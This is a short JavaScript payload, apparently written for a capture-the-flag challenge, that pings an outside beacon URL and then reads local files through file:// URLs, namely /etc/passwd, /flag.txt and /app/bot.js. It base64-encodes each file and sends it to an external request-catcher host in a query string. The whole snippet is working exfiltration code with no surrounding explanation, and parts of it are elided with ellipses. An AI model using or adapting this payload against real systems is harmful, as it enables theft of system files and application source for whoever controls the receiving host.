(function () {
  ...
  fetch('https://intigriti.42web.io/base.php?test=bhn');
  // Read /etc/passwd (Linux)
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(data => {
    fetch('https://aab.requestcatcher.com/test?data=' + btoa(data));
  });
...
fetch('file:///flag.txt')
  .then(r => r.text())
  .then(data => {
    fetch('https://aab.requestcatcher.com/test?flag=' + btoa(data));
  });
...
fetch('file:///app/bot.js')
  .then(r => r.text())
  .then(data => {
    fetch('https://aab.requestcatcher.com/test?bot=' + btoa(data));
  });
  fetch('https://aab.requestcatcher.com/test?test=bhn');
